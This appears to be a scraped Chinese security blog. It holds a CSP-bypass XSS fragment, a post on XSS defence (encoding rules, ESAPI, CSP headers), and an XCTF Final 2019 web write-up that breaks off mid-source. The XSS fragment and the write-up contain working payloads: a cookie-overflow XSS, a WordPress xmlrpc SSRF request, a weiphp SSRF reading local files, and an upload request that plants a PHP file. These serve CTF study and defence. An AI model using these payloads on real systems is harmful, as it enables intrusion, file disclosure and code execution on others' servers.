页面查看有没有设置该请求头就可以了。 鉴于此，我们还可以设法让网站返回错误页面。例如，为了强制 NGINX 返回400 bad request，你唯一需要做的，就是使用/../访问其上一级路径中的资源。为防止浏览器对请求进行规范化处理，导致/../被/所替换，对于中间的两个点号和最后一个斜线，我们可以使用 unicode 码来表示。也可以使用不正确的 unicode 路径，如/%z或/%%z。 123frame=document.createElement(\"iframe\");frame.src=\"/%2e%2e%2f\";document.body.appendChild(frame); 当然，如果以上不可用的话，我们可以利用比较简单也比较普遍的另一种方法，就是让 URL 超过所允许的长度。大多数现代浏览器都可以发送一个比 Web 服务器可以处理的长得多的 URL 。这样返回状态为414 Request-URI Too Large例如， NGINX 和 Apache 等 Web 服务器的默认 URL 长度通常被设置为不超过 8KB 。可以使用如下 payload: 123frame=document.createElement(\"iframe\");frame.src=\"/\"+\"A\".repeat(20000);document.body.appendChild(frame); 也可以使用超长的 cookie 来使服务器返回错误 1234567891011121314151617&lt;script&gt; for(var i=0;i&lt;5;i++){ document.cookie=i+\"=\"+\"a\".repeat(4000) }; f=document.createElement(\"iframe\"); f.id=\"pwn\"; f.src=\"/\"; f.onload=()=&gt;{ for(var i=0;i&lt;5;i++){ document.cookie=i+\"=\" }; x=document.createElement('script'); x.src='data:,alert(\"Pwned \"+top.secret.textContent)'; pwn.contentWindow.document.body.appendChild(x) }; document.body.appendChild(f);&lt;/script&gt; 也可以发送一个过长的 POST 请求，或者以某种方式引发 Web 服务器的500错误。 ReferenceCSP策略及绕过方法 XSS终结者-CSP理论与实践","link":"/2019/03/14/Web%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B-XSS-III/"},{"title":"Web安全从零开始 XSS IV","text":"这是自己写的 Web 安全从零开始系列之 XSS 篇。第四篇讲 XSS 防御。 [TOC] Defend无论是服务端型还是客户端型xss，攻击达成都需要两个条件 代码被注入 代码被执行 其实只要做好无论任何情况下保证代码不被执行就能完全杜绝 xss 攻击. 总之, 任何时候都不要把不受信任的数据直接插入到 dom 中的任何位置, 一定要做转义。 对于某些位置,不受信任的数据做转义就可以保证安全 一般的标签属性值(非事件属性) div body 的内部html 对于某些位置，即使做了转义依然不安全 script标签中 注释中 表签的属性名名 标签名 css标签中 使用 JSON.parse 而不是eval, request 的content-type要指定是Content-Type: application/json; 如果链接的URL中部分是动态生成的，一定要做转义。 Seven Principles原则1：不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码第一条原则其实是“Secure By Default”原则：不要往HTML页面中插入任何不可信数据，除非这些数据已经根据下面几条原则进行了编码。 之所以有这样一条原则存在，是因为 HTML 里有太多的地方容易形成XSS漏洞，而且形成漏洞的原因又有差别，比如有些漏洞发生在HTML标签里，有些发生在HTML标签的属性里，还有的发生在页面的&lt;Script&gt;里，甚至有些还出现在CSS里，再加上不同的浏览器对页面的解析或多或少有些不同，使得有些漏洞只在特定浏览器里才会产生。如果想要通过XSS过滤器（XSS Filter）对不可信数据进行转义或替换，那么XSS过滤器的过滤规则将会变得异常复杂，难以维护而且会有被绕过的风险。 所以实在想不出有什么理由要直接往HTML页面里插入不可信数据，就算是有XSS过滤器帮你做过滤，产生XSS漏洞的风险还是很高 123456789101112131415&lt;script&gt;…不要在这里直接插入不可信数据…&lt;/script&gt;直接插入到SCRIPT标签里 &lt;!– …不要在这里直接插入不可信数据… –&gt;插入到HTML注释里&lt;div 不要在这里直接插入不可信数据=”…”&gt;&lt;/div&gt;插入到HTML标签的属性名里&lt;div name=”…不要在这里直接插入不可信数据…”&gt;&lt;/div&gt;插入到HTML标签的属性值里&lt;不要在这里直接插入不可信数据 href=”…”&gt;&lt;/a&gt;作为HTML标签的名字&lt;style&gt;…不要在这里直接插入不可信数据…&lt;/style&gt;直接插入到CSS里 最重要的是，千万不要引入任何不可信的第三方 JavaScript 到页面里，一旦引入了，这些脚本就能够操纵你的HTML页面，窃取敏感信息或者发起钓鱼攻击等等。 原则2：在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码在这里相当强调是往HTML标签之间插入不可信数据，以区别于往HTML标签属性部分插入不可信数据，因为这两者需要进行不同类型的编码。当你确实需要往HTML标签之间插入不可信数据的时候，首先要做的就是对不可信数据进行HTML Entity编码。比如，我们经常需要往DIV，P，TD这些标签里放入一些用户提交的数据，这些数据是不可信的，需要对它们进行HTML Entity编码。很多Web框架都提供了HTML Entity编码的函数，我们只需要调用这些函数就好，而有些Web框架似乎更“智能”，比如Rails，它能在默认情况下对所有插入到HTML页面的数据进行HTML Entity编码，尽管不能完全防御XSS，但着实减轻了开发人员的负担。 12&lt;body&gt;…插入不可信数据前，对其进行HTML Entity编码…&lt;/body&gt;&lt;div&gt;…插入不可信数据前，对其进行HTML Entity编码…&lt;/div&gt;&lt;p&gt;…插入不可信数据前，对其进行HTML Entity编码…&lt;/p&gt;以此类推，往其他HTML标签之间插入不可信数据前，对其进行HTML Entity编码 [编码规则]那么HTML Entity编码具体应该做哪些事情呢？它需要对下面这6个特殊字符进行编码： 123456&amp; –&gt; &amp;amp;&lt; –&gt; &amp;lt;&gt; –&gt; &amp;gt;” –&gt; &amp;quot;‘ –&gt; &amp;#x27;/ –&gt; &amp;#x2f; 有两点需要特别说明的是: 不推荐将单引号( ‘ )编码为 ' 因为它并不是标准的HTML标签 需要对斜杠号( / )编码，因为在进行XSS攻击时，斜杠号对于关闭当前HTML标签非常有用 推荐使用OWASP提供的ESAPI函数库，它提供了一系列非常严格的用于进行各种安全编码的函数。在当前这个例子里，你可以使用: 1String encodedContent = ESAPI.encoder().encodeForHTML(request.getParameter(“input”)); 这条原则是指，当你要往HTML属性（例如width、name、value属性）的值部分(data value)插入不可信数据的时候，应该对数据进行HTML属性编码。不过需要注意的是，当要往HTML标签的事件处理属性（例如onmouseover）里插入数据的时候，本条原则不适用，应该用下面介绍的原则4对其进行JavaScript编码。 12345&lt;div attr=…插入不可信数据前，进行HTML属性编码…&gt;&lt;/div&gt;属性值部分没有使用引号，不推荐 &lt;div attr=’…插入不可信数据前，进行HTML属性编码…’&gt;&lt;/div&gt;属性值部分使用了单引号&lt;div attr=”…插入不可信数据前，进行HTML属性编码…”&gt;&lt;/div&gt;属性值部分使用了双引号 [编码规则] 除了空格符可以闭合当前属性外，这些符号也可以： % * + , – / ; &lt; = &gt; ^ | `(反单引号，IE会认为它是单引号) 可以使用ESAPI提供的函数进行HTML属性编码： 1String encodedContent = ESAPI.encoder().encodeForHTMLAttribute(request.getParameter(“input”)); 原则4：在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码这条原则主要针对动态生成的JavaScript代码，这包括脚本部分以及HTML标签的事件处理属性（Event Handler，如onmouseover, onload等）。在往JavaScript代码里插入数据的时候，只有一种情况是安全的，那就是对不可信数据进行JavaScript编码，并且只把这些数据放到使用引号包围起来的值部分（data value）之中，例如： 123&lt;script&gt;var message = “&lt;%= encodeJavaScript(@INPUT) %&gt;”;&lt;/script&gt; 除此之外，往JavaScript代码里其他任何地方插入不可信数据都是相当危险的，攻击者可以很容易地插入攻击代码。 123456789&lt;script&gt;alert(‘…插入不可信数据前，进行JavaScript编码…’)&lt;/script&gt;值部分使用了单引号 &lt;script&gt;x = “…插入不可信数据前，进行JavaScript编码…”&lt;/script&gt;值部分使用了双引号&lt;div onmouseover=”x=’…插入不可信数据前，进行JavaScript编码…’ “&lt;/div&gt;值部分使用了引号，且事件处理属性的值部分也使用了引号特别需要注意的是，在XSS防御中，有些JavaScript函数是极度危险的，就算对不可信数据进行JavaScript编码，也依然会产生XSS漏洞，例如：&lt;script&gt;window.setInterval(‘…就算对不可信数据进行了JavaScript编码，这里依然会有XSS漏洞…’);&lt;/script&gt; [编码规则] 除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \\xHH （以 \\x 开头，HH则是指该字符对应的十六进制数字） 在对不可信数据做编码的时候，千万不能图方便使用反斜杠（ \\ ）对特殊字符进行简单转义，比如将双引号 ” 转义成 \\” ，这样做是不可靠的，因为浏览器在对页面做解析的时候，会先进行HTML解析，然后才是JavaScript解析，所以双引号很可能会被当做HTML字符进行HTML解析，这时双引号就可以突破代码的值部分，使得攻击者可以继续进行XSS攻击。 可以使用ESAPI提供的函数进行JavaScript编码： 1String encodedContent = ESAPI.encoder().encodeForJavaScript(request.getParameter(“input”)); 原则5：在将不可信数据插入到Style属性里时，对这些数据进行CSS编码当需要往Stylesheet，Style标签或者Style属性里插入不可信数据的时候，需要对这些数据进行CSS编码。传统印象里CSS不过是负责页面样式的，但是实际上它比我们想象的要强大许多，而且还可以用来进行各种攻击。因此，不要对CSS里存放不可信数据掉以轻心，应该只允许把不可信数据放入到CSS属性的值部分，并进行适当的编码。除此以外，最好不要把不可信数据放到一些复杂属性里，比如url, behavior等，只能被IE认识的Expression属性允许执行JavaScript脚本，因此也不推荐把不可信数据放到这里。 12&lt;style&gt;selector { property : …插入不可信数据前，进行CSS编码…} &lt;/style&gt;&lt;style&gt;selector { property : ” …插入不可信数据前，进行CSS编码… “} &lt;/style&gt;&lt;span style=” property : …插入不可信数据前，进行CSS编码… ”&gt; … &lt;/span&gt; [编码规则] 除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \\HH （以 \\ 开头，HH则是指该字符对应的十六进制数字） 同原则2，原则3，在对不可信数据进行编码的时候，切忌投机取巧对双引号等特殊字符进行简单转义，攻击者可以想办法绕开这类限制。 可以使用ESAPI提供的函数进行CSS编码： 1String encodedContent = ESAPI.encoder().encodeForCSS(request.getParameter(“input”)); 原则6：在将不可信数据插入到HTML URL里时，对这些数据进行URL编码当需要往HTML页面中的URL里插入不可信数据的时候，需要对其进行URL编码，如下： 1&lt;a href=”http://www.abcd.com?param=…插入不可信数据前，进行URL编码…”&gt; Link Content &lt;/a&gt; [编码规则] 除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 %HH （以 % 开头，HH则是指该字符对应的十六进制数字） 在对URL进行编码的时候，有两点是需要特别注意的： 1) URL属性应该使用引号将值部分包围起来，否则攻击者可以很容易突破当前属性区域，插入后续攻击代码2) 不要对整个URL进行编码，因为不可信数据可能会被插入到href, src或者其他以URL为基础的属性里，这时需要对数据的起始部分的协议字段进行验证，否则攻击者可以改变URL的协议，例如从HTTP协议改为DATA伪协议，或者javascript伪协议。 可以使用ESAPI提供的函数进行URL编码： 1String encodedContent = ESAPI.encoder().encodeForURL(request.getParameter(“input”)); ESAPI还提供了一些用于检测不可信数据的函数，在这里我们可以使用其来检测不可信数据是否真的是一个URL： 1234String userProvidedURL = request.getParameter(“userProvidedURL”);boolean isValidURL = ESAPI.validator().isValidInput(“URLContext”, userProvidedURL, “URL”, 255, false); if (isValidURL) {&lt;a href=”&lt;%= encoder.encodeForHTMLAttribute(userProvidedURL) %&gt;”&gt;&lt;/a&gt;} 原则7：使用富文本时，使用XSS规则引擎进行编码过滤Web应用一般都会提供用户输入富文本信息的功能，比如BBS发帖，写博客文章等，用户提交的富文本信息里往往包含了HTML标签，甚至是JavaScript脚本，如果不对其进行适当的编码过滤的话，则会形成XSS漏洞。但我们又不能因为害怕产生XSS漏洞，所以就不允许用户输入富文本，这样对用户体验伤害很大。 针对富文本的特殊性，我们可以使用XSS规则引擎对用户输入进行编码过滤，只允许用户输入安全的HTML标签，如&lt;b&gt;,&lt;i&gt;,&lt;p&gt;等，对其他数据进行HTML编码。需要注意的是，经过规则引擎编码过滤后的内容只能放在&lt;div&gt;,&lt;p&gt;等安全的HTML标签里，不要放到HTML标签的属性值里，更不要放到HTML事件处理属性里，或者放到&lt;SCRIPT&gt;标签里。 推荐XSS规则过滤引擎：OWASP AntiSamp或者Java HTML Sanitizer Summary 当输出点出现在HTML标签属性： 12345&lt; -&gt; &amp;lt;&gt; -&gt; &amp;gt;&amp; -&gt; &amp;amp;\" -&gt; &amp;quot;' -&gt; &amp;#39 当输出点出现在&lt;script&gt;标签中。这种情况相当危险，不需要考虑xss触发，只需要考虑编写js即可 123456' -&gt; \\';\" -&gt; \\\";\\ -&gt; \\\\;/ -&gt; \\/;(换行符) -&gt; \\n;(回车符) -&gt; \\r; 当输出点出现在body中 12345&lt; -&gt; &amp;lt;&gt; -&gt; &amp;gt;&amp; -&gt; &amp;amp;\" -&gt; &amp;quot;' -&gt; &amp;#39 当输出点出现在js事件中(onClick=”你的代码”) 123456789&lt; -&gt; &amp;lt;&gt; -&gt; &amp;gt;&amp; -&gt; &amp;amp;\" -&gt; &amp;quot;' -&gt; &amp;#39\\ -&gt; \\\\;/ -&gt; \\/;(换行符) -&gt; \\n;(回车符) -&gt; \\r; 输出在URL属性中&lt;script src=\"你的代码\"&gt; URL编码 Escapehtmlspecialchars - php 1htmlspecialchars ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string $encoding = ini_get(\"default_charset\") [, bool $double_encode = TRUE ]]] ) : string 将特殊字符转换为 HTML 实体 string 待转换的 string。 flags 位掩码，由以下某个或多个标记组成，设置转义处理细节、无效单元序列、文档类型。 默认是 ENT_COMPAT | ENT_HTML401。 double_encode 关闭 double_encode 时，PHP 不会转换现有的 HTML 实体， 默认是全部转换。 encoding An optional argument defining the encoding used when converting characters. 字符 替换后 &amp; (&amp; 符号) &amp;amp; “ (双引号) &amp;quot，除非设置了 ENT_NOQUOTES ‘ (单引号) 设置了 ENT_QUOTES 后， &amp;#039; (如果是 ENT_HTML401) ，或者 &amp;apos; (如果是 ENT_XML1、 ENT_XHTML或 ENT_HTML5)。 *&lt;* (小于) &amp;lt; &gt; (大于) &amp;gt; htmlentities - php ​ 本函数各方面都和 htmlspecialchars() 一样， 除了 htmlentities() 会转换所有具有 HTML 实体的字符。 Front end前端过滤 123456789101112131415function xssCheck(str,reg){ return str ? str.replace(reg || /[&amp;&lt;\"&gt;'](?:(amp|lt|quot|gt|#39|nbsp|#\\d+);)?/g, function (a, b) { if(b){ return a; }else{ return { '&lt;':'&amp;lt;', '&amp;':'&amp;amp;', '\"':'&amp;quot;', '&gt;':'&amp;gt;', \"'\":'&amp;#39;', }[a] } }) : '';} HTTP HeaderX-XSS-Protection可以通过 http 头控制是否打开 xss-filter，默认为开启。 通常情况下, 在http header中加入以下字段表示启用 xss-filter。除了 Firefox ，连 IE 8 以上均支持 X-XSS-Protection 1234X-XSS-Protection: 0X-XSS-Protection: 1X-XSS-Protection: 1; mode=blockX-XSS-Protection: 1; report=&lt;reporting-uri&gt; 0 禁止XSS过滤。 1 启用XSS过滤（通常浏览器是默认的）。 如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）。 1;mode=block 启用XSS过滤。 如果检测到攻击，浏览器将不会清除页面，而是阻止页面加载。 1; report= (Chromium only) 启用XSS过滤。 如果检测到跨站脚本攻击，浏览器将清除页面并使用CSP report-uri指令的功能发送违规报告。 如上, 现代浏览器都对反射型 xss 有一定的防御力，其原理是检查 url 和 dom 中元素的相关性，但这并不能完全防止反射型 xss 另外, 浏览器对于存储型 xss 并没有抵抗力, 原因很简单, 用户的需求是多种多样的. 所以, 抵御xss这件事情不能指望浏览器。 Content Security Policy还有就是我们之前介绍的 CSP 策略了。 为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了 CSP。CSP 管理网站允许加载的内容, 并且使用白名单的机制对网站加载或执行的资源起作用。在网页中, 这样的策略通过 HTTP 头信息或者 meta 元素定义。 CSP 并不是用来防止 xss 攻击的，而是最小化 xss 发生后所造成的伤害。实际上, 除了开发者自己做好 xss 转义, 并没有别的方法可以防止 xss 的发生. CSP 可以说是 HTML5 给web安全带来的最实惠的东西。那么如何引入 CSP 呢？ 通过响应头 只允许脚本从本源加载Content-Security-Policy: script-src 'self' 通过 HTML 的 META 标签 1&lt;meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'self'\"&gt; 那么 CSP 除了限制 script-src 之外还能限制什么呢？ base-uri : 限制这篇文档的uri child-src ：限制子窗口的源(iframe,弹窗等),取代 frame-src connect-src ：限制脚本可以访问的源 font-src : 限制字体的源 form-action : 限制表单能够提交到的源 frame-ancestors : 限制了当前页面可以被哪些页面以iframe,frame,object等方式加载 frame-src ：deprecated with child-src,限制了当前页面可以加载哪些源，与frame-ancestors对应 img-src : 限制图片可以从哪些源加载 media-src : 限制video, audio, source, track 能够从哪些源加载 object-src ：限制插件可以从哪些源加载 sandbox ：强制打开沙盒模式 另外，CSP 还提供一个报告的头域 Content-Security-Policy-Report-Only，使用这个头域，浏览器会向服务器报告 csp 状态。 1Content-Security-Policy-Report-Only: script-src 'self'; report-uri http://cspReport/ 使用了上面的设置, 若页面上存在内联的 js，它依然会执行，不过浏览器会向发送一个 post 请求，包含如下信息： 123456789{ \"csp-report\":{ \"document-uri\": \"http://cspReport/test.php\", \"referrer\": \"\", \"violated-directive\": \"script-src 'self'\", \"original-policy\": \"script-src 'self'; report-uri http://cspReport/\", \"blocked-uri\": \"\" }} CSP 目前有两版, [CSP1][] 和 [CSP2][]. 两版的支持状态可以在 http://caniuse.com/#search=csp 中查到. 如下: CSP 1.0: CSP 2.0: X-Frame-Options ​ X-Frame-Options 有三个值: DENY 表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。 SAMEORIGIN 表示该页面可以在相同域名页面的 frame 中展示。 ALLOW-FROM *uri* 表示该页面可以在指定来源的 frame 中展示。 X-Frame-Options 响应头是用来给浏览器指示允许一个页面可否在 frame, iframe 或者 object 等标签中展现的标记. 网站可以使用此功能, 来确保自己网站的内容没有被嵌到别人的网站中去, 也从而避免了点击劫持 (clickjacking) 的攻击. 但以后可能被CSP的 frame-ancestors取代。目前支持的状态比起 CSP frame-ancestors要好。 HttpOnly当 Cookie 在消息头中被设置为 HttpOnly 时，这样支持 Cookie 的浏览器将阻止客户端 Javascript 直接访问浏览器中的 cookies ，从而达到保护敏感数据的作用。 X-Content-Type-Options ​ X-Content-Type-Options: nosniff nosniff ​ 假如请求类型为以下两种，那么阻止请求的发生： “style“ 但是 MIME 类型不是 “text/css“， “script“ 但是 MIME 类型不是 JavaScript MIME 类型。 X-Content-Type-Options 响应首部相当于一个提示标志，被服务器用来提示客户端一定要遵循在 Content-Type 首部中对 MIME 类型 的设定，而不能对其进行修改。这就禁用了客户端的 MIME 类型嗅探行为，换句话说，也就是意味着网站管理员确定自己的设置没有问题。 Reference防御XSS的七条原则 xss攻防浅谈","link":"/2019/03/14/Web%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B-XSS-IV/"},{"title":"XCTF Final 2019 Web Write Up","text":"我们 SU 这次一共做出了3个 Web ，由于今年 XCTF Final 的时间不是特别好，我们队其他师傅有考试的考试，基本就现场的两个 Web 手在做，最后 LFI2019 比较可惜，如果多个几 min 我们就可以出了，实在可惜。下面就写写本次的 Web Write Up。 [TOC] Webbabyblog界面跟 Byte CTF 的 babyblog 一致，有些功能还保留着，很有误导性…以为是个升级版，前者是一道二次注入后用 php 正则/e特性来执行命令的，所以我们一开始也就一直在日注入了… 后来我发现/user个人界面有 ip 记录，于是尝试 XFF 注入无果，但是可以把 XFF 直接回显到页面上。发现/server_status，发现有大家的访问记录。陷入思考ing… 队友突然看到有一个访问记录/user/1.css（类似的这么一个路由，不太想得起来了），马上想到可能是缓存投毒，联想跟上文说的 XFF 的设置，想到可以缓存投毒将反射 xss 变成缓存 xss ，这样就可以打到 admin 了。 babypress这题比较狗血…前一天给了两个 hint : 123first hint for babypress: ssrf n-day exploit on the internet will not worksecond hint: if you can exploit in your local, it should be possible to exploit in remote. 随便搜一下我们大概可以知道 ssrf n-day 是通过 xmlrpc.php 这个文件来打内网的，然后当晚我们通过xmlrpc.php成功进行了 SSRF ，当看到了这两个 hint …我们就感觉不妙，应该打的不是我们这个， but 我们确实打成功了呀…于是我们当晚又加了一会班，当时最新版本是 5.2.4 ，于是我们找到 5.2.4 的 security issue，然后找到了更新补丁，但是感觉绕不过…以为是个新的绕过方式啥的… 好了，结果到了第二天一开始没人打成功…后来，到了差不多中午主办方又发公告更换环境，当时我们都在看另一个题，也就没管，结果一会有两个队出了…然后我们试了一下昨晚我们打xmlrpc.php的，就成了… 1234567&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://&lt;YOUR SERVER &gt;:&lt;port&gt;&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://&lt;SOME VALID BLOG FROM THE SITE &gt;&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt; 主要就是要发一个评论以及更改一下第二个参数为他的 host 才行…这题也没啥好说的…感觉全场唯一的槽点(Web)就是这个了。 weiphp一个叫 weiphp 的 CMS 审计，这个主要是队友看的，我当时做另外一道题去了。我们出的是一个 ssrf 的地方，赛后问了出的师傅，是审了上传的地方。 SSRF我们全局搜curl，可以在 Base.php 中发现有以下代码： 12345678910111213141516171819public function post_data($url, $param, $type = 'json', $return_array = true, $useCert = []){ $res = post_data($url, $param, $type, $return_array, $useCert); // 各种常见错误判断 if (isset($res['curl_erron'])) { $this-&gt;error($res['curl_erron'] . ': ' . $res['curl_error']); } if ($return_array) { if (isset($res['errcode']) &amp;&amp; $res['errcode'] != 0) { $this-&gt;error(error_msg($res)); } elseif (isset($res['return_code']) &amp;&amp; $res['return_code'] == 'FAIL' &amp;&amp; isset($res['return_msg'])) { $this-&gt;error($res['return_msg']); } elseif (isset($res['result_code']) &amp;&amp; $res['result_code'] == 'FAIL' &amp;&amp; isset($res['err_code']) &amp;&amp; isset($res['err_code_des'])) { $this-&gt;error($res['err_code'] . ': ' . $res['err_code_des']); } } return $res;} 跟进第三行的post_data，我们可以在 common.php 中找到该函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778function post_data($url, $param = [], $type = 'json', $return_array = true, $useCert = []){ $has_json = false; if ($type == 'json' &amp;&amp; is_array($param)) { $has_json = true; $param = json_encode($param, JSON_UNESCAPED_UNICODE); } elseif ($type == 'xml' &amp;&amp; is_array($param)) { $param = ToXml($param); } add_debug_log($url, 'post_data'); // 初始化curl $ch = curl_init(); if ($type != 'file') { add_debug_log($param, 'post_data'); // 设置超时 curl_setopt($ch, CURLOPT_TIMEOUT, 30); } else { // 设置超时 curl_setopt($ch, CURLOPT_TIMEOUT, 180); } curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); // 设置header if ($type == 'file') { $header[] = \"content-type: multipart/form-data; charset=UTF-8\"; curl_setopt($ch, CURLOPT_HTTPHEADER, $header); } elseif ($type == 'xml') { curl_setopt($ch, CURLOPT_HEADER, false); } elseif ($has_json) { $header[] = \"content-type: application/json; charset=UTF-8\"; curl_setopt($ch, CURLOPT_HTTPHEADER, $header); } // curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)'); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_AUTOREFERER, 1); // dump($param); curl_setopt($ch, CURLOPT_POSTFIELDS, $param); // 要求结果为字符串且输出到屏幕上 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // 使用证书：cert 与 key 分别属于两个.pem文件 if (isset($useCert['certPath']) &amp;&amp; isset($useCert['keyPath'])) { curl_setopt($ch, CURLOPT_SSLCERTTYPE, 'PEM'); curl_setopt($ch, CURLOPT_SSLCERT, $useCert['certPath']); curl_setopt($ch, CURLOPT_SSLKEYTYPE, 'PEM'); curl_setopt($ch, CURLOPT_SSLKEY, $useCert['keyPath']); } $res = curl_exec($ch); if ($type != 'file') { add_debug_log($res, 'post_data'); } // echo $res;die; $flat = curl_errno($ch); $msg = ''; if ($flat) { $msg = curl_error($ch); } // add_request_log($url, $param, $res, $flat, $msg); if ($flat) { return [ 'curl_erron' =&gt; $flat, 'curl_error' =&gt; $msg ]; } else { if ($return_array &amp;&amp; !empty($res)) { $res = $type == 'json' ? json_decode($res, true) : FromXml($res); } return $res; }} 可以看到 common.php 中的没有什么过滤，所以我们只需要找引用 Base.php 当中的post_data函数的地方就行了。我们随便登录一下就可以发现其路由规则了，比如登录路由是index.php/home/user/login，对应的是application/home/controller/User.php当中的login()方法，而 Base.php 跟其他 controller 有以下继承关系： 1home/controller/User.php -&gt; home/controller/Home.php -&gt; common/controller/WebBase.php -&gt; common/controller/Base.php 所以post_data为 public 方法也可以直接调用，所以根据post_data方法的参数，我们需要传入几个参数，url为 SSRF 的点，param随笔即可。 这里由于 cms 开启了 debug ，这里要把type参数设为file，让post_data函数在调用FromXml函数的时候，由于我们传入诸如url=file:///etc/passwd的参数，会导致simple_xml_load_string出错 12345678910111213141516171819/** * 将xml转为array */function FromXml($xml){ if (!$xml) { exception(\"xml数据异常！\"); } file_log($xml, 'FromXml'); // 解决部分json数据误入的问题 $arr = json_decode($xml, true); if (is_array($arr) &amp;&amp; !empty($arr)) { return $arr; } // 将XML转为array $arr = json_decode(json_encode(simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOCDATA)), true); return $arr;} 可以看到在图中已经拿到了文件内容回显，所以当时我们就用这个 SSRF 拿到了 flag upload在application/home/controller/File.php我们可以看到有这么一个方法 123456789101112131415161718192021222324252627/* 文件上传 到根目录 */public function upload_root() { $return = array( 'status' =&gt; 1, 'info' =&gt; '上传成功', 'data' =&gt; '' ); /* 调用文件上传组件上传文件 */ $File = D('home/File'); $file_driver = strtolower(config('picture_upload_driver')); $setting = array ( 'rootPath' =&gt; './' , ); $info = $File-&gt;upload($setting, config('picture_upload_driver'), config(\"upload_{$file_driver}_config\")); // $info = $File-&gt;upload(config('download_upload'), config('picture_upload_driver'), config(\"upload_{$file_driver}_config\")); /* 记录附件信息 */ if ($info) { $return['status'] = 1; $return = array_merge($info['download'], $return); } else { $return['status'] = 0; $return['info'] = $File-&gt;getError(); } /* 返回JSON数据 */ return json_encode($return);} 其中是调用了application/home/model/File.php中的一个upload函数 123456public function upload($setting = [], $driver = 'Local', $config = null, $isTest = false){true... $info = upload_files($setting, $driver, $config, 'download', $isTest); ...} 这个函数又调用了application/common.php当中的upload_files函数，然后我们可以发现又这么一段神奇的代码： 1234567891011121314if ($type == 'picture') { //图片扩展名验证 ，图片大小不超过20M $checkRule['ext'] = 'gif,jpg,jpeg,png,bmp'; $checkRule['size'] = 20971520;} else { $allowExt = input('allow_file_ext', ''); if ($allowExt != '') { $checkRule['ext'] = $allowExt; } $allowSize = input('allow_file_maxsize', ''); if ($allowSize &gt; 0) { $checkRule['size'] = $allowSize; }} 这里input('allow_file_ext', '');表示我们可以设置允许上传的类型…然后我们随便上传一个试试 1234567891011121314151617181920212223242526272829POST /weiphp/public/index.php/home/file/upload_root HTTP/1.1Host: zedd.vvUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------6593480186465200061941970669Content-Length: 480Origin: http://zedd.vvConnection: closeReferer: http://zedd.vv/upload.htmlCookie: PHPSESSID=0cfb281c78e25924ebb7c8abe9084590Upgrade-Insecure-Requests: 1-----------------------------6593480186465200061941970669Content-Disposition: form-data; name=\"name\"; filename=\"1.phtml\"Content-Type: text/php&lt;?phpphpinfo();?&gt;-----------------------------6593480186465200061941970669Content-Disposition: form-data; name=\"allow_file_ext\"phtml-----------------------------6593480186465200061941970669Content-Disposition: form-data; name=\"allow_file_maxsize\"1024-----------------------------6593480186465200061941970669-- 虽然报错了但是我们依然上传成功了，直接访问那个路径即可。 lfi2019在 header 头有一个提示可以拿到源码 1X-Hint: /index.php?show-me-the-hint 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356&lt;?php /* Developed by stypr. Made in 2018, Releasing in 2019! */ // Baka flag-sama and seed-chan! // error_reporting(0); ini_set(\"display_errors\",\"off\"); @require('flag.php'); $seed = md5(rand(PHP_INT_MIN,PHP_INT_MAX)); if($flag === $_GET['trigger']){ die(hash(\"sha256\", $seed . $flag)); } // Sessions are never used but we add that // ini_set('session.cookie_httponly', 1); @phpinfo(); ini_set('session.cookie_secure', 1); @phpinfo(); ini_set('session.use_only_cookies',1); @phpinfo(); ini_set('session.gc_probability', 1); @phpinfo(); // but really, you can't really do something with sessions. // session_save_path('./sess/'); session_name(\"lfi2019\"); session_start(); session_destroy(); // Flush directory for security purposes // // Referenced it from StackOverflow: https://bit.ly/2MxvxXE // function rrmdir($dir, $depth=0){ if (is_dir($dir)){ $objects = scandir($dir); foreach ($objects as $object){ if ($object != \".\" &amp;&amp; $object != 